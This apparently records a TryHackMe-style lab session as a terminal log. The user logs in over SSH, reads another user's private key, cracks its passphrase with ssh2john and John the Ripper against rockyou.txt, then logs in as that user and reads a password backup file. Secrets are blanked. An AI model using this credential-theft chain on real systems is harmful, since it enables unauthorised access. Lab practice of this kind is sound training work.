@@ -1,0 +1,142 @@
+┌──(kali㉿kali)-[~/Desktop/new/TP_THM]
+└─$ ssh jan@10.65.144.236
+The authenticity of host '10.65.144.236 (10.65.144.236)' can't be established.
+ED25519 key fingerprint is: SHA256:Asc5d/99J7tj8YxnSm6y+AjgqXlZyGQNWvngVncG44Y
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.65.144.236' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+jan@10.65.144.236's password: 
+Permission denied, please try again.
+jan@10.65.144.236's password: 
+Permission denied, please try again.
+jan@10.65.144.236's password: 
+jan@10.65.144.236: Permission denied (publickey,password).
+                                                                                                     
+                                                                                                     
+┌──(kali㉿kali)-[~/Desktop/new/TP_THM]
+└─$ ssh jan@10.65.144.236
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+jan@10.65.144.236's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed 07 Oct 2026 05:40:26 PM EDT
+
+  System load:  0.01               Processes:             112
+  Usage of /:   49.8% of 13.62GB   Users logged in:       0
+  Memory usage: 57%                IPv4 address for ens5: 10.65.144.236
+  Swap usage:   0%
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
+jan@ip-10-65-144-236:~$ cd /home/kay/.ssh
+jan@ip-10-65-144-236:/home/kay/.ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+[]
+-----END RSA PRIVATE KEY-----
+jan@ip-10-65-144-236:/home/kay/.ssh$ 
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ cd Desktop             
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nano clave_kay.pem
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Desktop]
+└─$ chmod 600 clave_kay.pem
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nano clave_kay.pem     
+                                                                                                                                                                      
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh2john clave_kay.pem > hash_kay.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash_kay.txt
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[]          (clave_kay.pem)     
+1g 0:00:00:00 DONE (2026-10-07 17:48) 12.50g/s 1034Kp/s 1034Kc/s 1034KC/s betzabeth..beba21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                                                                                                                                                
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i clave_kay.pem kay@10.65.144.236
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'clave_kay.pem': 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed 07 Oct 2026 05:52:42 PM EDT
+
+  System load:  0.0                Processes:             117
+  Usage of /:   49.9% of 13.62GB   Users logged in:       1
+  Memory usage: 57%                IPv4 address for ens5: 10.65.144.236
+  Swap usage:   0%
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
+kay@ip-10-65-144-236:~$ cat /home/kay/pass.bak
+[]$$
